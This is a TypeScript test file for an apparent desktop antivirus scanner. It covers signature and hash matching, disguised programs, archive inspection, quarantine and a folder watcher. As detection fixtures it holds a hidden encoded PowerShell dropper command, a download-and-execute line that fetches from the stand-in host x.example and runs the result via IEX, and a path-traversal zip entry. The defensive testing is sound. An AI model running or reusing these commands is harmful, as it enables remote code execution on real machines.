import { mkdtemp, readFile, readdir, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deflateRawSync } from "node:zlib";

import { beforeEach, describe, expect, it, vi } from "vitest";

import { parseClamOutput } from "../src/engine/clamav";
import { EICAR, nameFindings } from "../src/engine/rules";
import { Quarantine } from "../src/engine/quarantine";
import { scanFile } from "../src/engine/scanner";
import { SignatureStore, sha256OfBuffer } from "../src/engine/signatures";
import { sanitizeChanges } from "../src/engine/settings";
import { FolderWatcher } from "../src/engine/watcher";
import { walk } from "../src/engine/walk";
import { listEntries, readEntry } from "../src/engine/zip";

/** Builds a real ZIP archive (deflate) in memory. */
function zip(files: Record<string, Buffer | string>, encrypted = false): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const [name, raw] of Object.entries(files)) {
    const data = Buffer.from(raw);
    const packed = deflateRawSync(data);
    const nameBytes = Buffer.from(name);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(encrypted ? 1 : 0, 6);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(packed.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(encrypted ? 1 : 0, 8);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(packed.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt32LE(offset, 42);
    locals.push(local, nameBytes, packed);
    centrals.push(central, nameBytes);
    offset += 30 + nameBytes.length + packed.length;
  }
  const centralBuffer = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(centralBuffer.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, centralBuffer, end]);
}

let dir: string;
let signatures: SignatureStore;
beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "sentinel-desktop-"));
  signatures = new SignatureStore(join(dir, "signatures.json"));
});

async function file(name: string, content: Buffer | string): Promise<string> {
  const path = join(dir, name);
  await writeFile(path, content);
  return path;
}

describe("scanner", () => {
  it("detects the EICAR test file as malicious", async () => {
    const result = await scanFile(await file("eicar.com", EICAR), { signatures });
    expect(result.verdict).toBe("malicious");
    expect(result.findings[0]?.rule).toBe("eicar");
  });

  it("matches known malware fingerprints", async () => {
    const content = Buffer.from("pretend this is a real malware sample");
    await signatures.save({ version: "1", updatedAt: "now", sources: ["MalwareBazaar"], sha256: [sha256OfBuffer(content)] });
    const result = await scanFile(await file("sample.bin", content), { signatures });
    expect(result.verdict).toBe("malicious");
    expect(result.findings.map((f) => f.rule)).toContain("known_hash");
  });

  it("never calls an ordinary file safe", async () => {
    const result = await scanFile(await file("notes.txt", "Shopping list: milk, bread"), { signatures });
    expect(result.verdict).toBe("no_known_threat");
    expect(result.findings).toEqual([]);
  });

  it("flags programs disguised as documents", async () => {
    const pe = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(200)]);
    const disguised = await scanFile(await file("invoice.pdf", pe), { signatures });
    expect(disguised.verdict).toBe("suspicious");
    expect(disguised.findings.map((f) => f.rule)).toContain("disguised_program");
    const double = await scanFile(await file("invoice.pdf.exe", pe), { signatures });
    expect(double.findings.map((f) => f.rule)).toContain("double_extension");
    expect(nameFindings("photo‮gpj.exe")[0]?.rule).toBe("rtlo_name");
  });

  it("recognises droppers in scripts", async () => {
    const ps = "powershell -NoP -W Hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
    const result = await scanFile(await file("update.bat", ps), { signatures });
    expect(result.findings.map((f) => f.rule)).toContain("encoded_powershell");
    const dl = await scanFile(await file("run.ps1", "$c = (New-Object Net.WebClient).DownloadString('http://x.example/a'); IEX $c"), { signatures });
    expect(dl.findings.map((f) => f.rule)).toContain("download_execute");
    expect((await scanFile(await file("readme.txt", "powershell -enc AAAA"), { signatures })).findings).toEqual([]);
  });

  it("looks inside archives without extracting them", async () => {
    const member = Buffer.from("known bad member");
    await signatures.save({ version: "1", updatedAt: "now", sources: [], sha256: [sha256OfBuffer(member)] });
    const archive = zip({ "docs/eicar.com": EICAR, "tool.bin": member, "../escape.txt": "x" });
    const result = await scanFile(await file("bundle.zip", archive), { signatures });
    const rules = result.findings.map((f) => f.rule);
    expect(rules).toEqual(expect.arrayContaining(["eicar", "known_hash_member", "archive_traversal"]));
    expect(result.verdict).toBe("malicious");
    // Nothing was extracted next to the archive.
    expect((await readdir(dir)).sort()).toEqual(["bundle.zip", "signatures.json"]);
  });

  it("reports macros in Office documents", async () => {
    const docx = zip({ "[Content_Types].xml": "<Types/>", "word/vbaProject.bin": "macro" });
    const result = await scanFile(await file("letter.docm", docx), { signatures });
    expect(result.findings.map((f) => f.rule)).toContain("office_macros");
  });

  it("stops a zip member that inflates beyond its declared size", () => {
    const archive = zip({ "big.txt": Buffer.alloc(1_000_000) });
    const [entry] = listEntries(archive);
    expect(readEntry(archive, { ...entry!, size: 10 }, 1000)).toBeNull();
  });

  it("uses the cloud lookup only when given one", async () => {
    const lookup = vi.fn(async () => "MalwareBazaar");
    const result = await scanFile(await file("x.bin", "something"), { signatures, cloudLookup: lookup });
    expect(lookup).toHaveBeenCalledOnce();
    expect(result.verdict).toBe("malicious");
    expect(result.engines).toContain("cloud");
  });

  it("parses ClamAV output", () => {
    expect(parseClamOutput("/tmp/x: Win.Test.EICAR_HDB-1 FOUND\n")).toEqual({ infected: true, signature: "Win.Test.EICAR_HDB-1" });
    expect(parseClamOutput("/tmp/x: OK\n").infected).toBe(false);
  });
});

describe("quarantine", () => {
  it("encrypts, restores and deletes", async () => {
    const quarantine = new Quarantine(join(dir, "q"));
    const original = await file("eicar.com", EICAR);
    const item = await quarantine.add(original, { sha256: null, verdict: "malicious", reason: "EICAR" });
    await expect(stat(original)).rejects.toThrow();
    const stored = await readFile(join(dir, "q", `${item.id}.bin`));
    expect(stored.includes(EICAR)).toBe(false); // neutralised on disk
    expect((await quarantine.list())[0]).not.toHaveProperty("key");

    await writeFile(original, "a new file took its place");
    const restored = await quarantine.restore(item.id);
    expect(restored).toMatch(/eicar \(restored 1\)\.com$/);
    expect((await readFile(restored)).equals(EICAR)).toBe(true);
    expect(await quarantine.list()).toEqual([]);

    const again = await quarantine.add(restored, { sha256: null, verdict: "malicious", reason: "EICAR" });
    await quarantine.remove(again.id);
    expect(await quarantine.list()).toEqual([]);
  });
});

describe("watcher and walking", () => {
  it("scans a new file only after it stops changing, ignoring partial downloads", async () => {
    const seen: string[] = [];
    const watcher = new FolderWatcher((path) => seen.push(path), 150);
    watcher.set([dir]);
    await writeFile(join(dir, "setup.exe.crdownload"), "partial");
    await writeFile(join(dir, "report.pdf"), "done");
    await new Promise((resolve) => setTimeout(resolve, 800));
    watcher.close();
    expect(seen).toEqual([join(dir, "report.pdf")]);
  });

  it("walks folders without following links", async () => {
    await file("a.txt", "a");
    const found = [];
    for await (const path of walk(dir)) found.push(path);
    expect(found).toContain(join(dir, "a.txt"));
  });
});

describe("settings", () => {
  it("accepts only known settings and safe server addresses", () => {
    expect(sanitizeChanges({ autoQuarantine: false, evil: 1 })).toEqual({ autoQuarantine: false });
    expect(sanitizeChanges({ serverUrl: "https://sentinel.example.org/path" }).serverUrl).toBe("https://sentinel.example.org");
    expect(() => sanitizeChanges({ serverUrl: "http://sentinel.example.org" })).toThrow();
    expect(sanitizeChanges({ serverUrl: "http://localhost:8080" }).serverUrl).toBe("http://localhost:8080");
  });
});
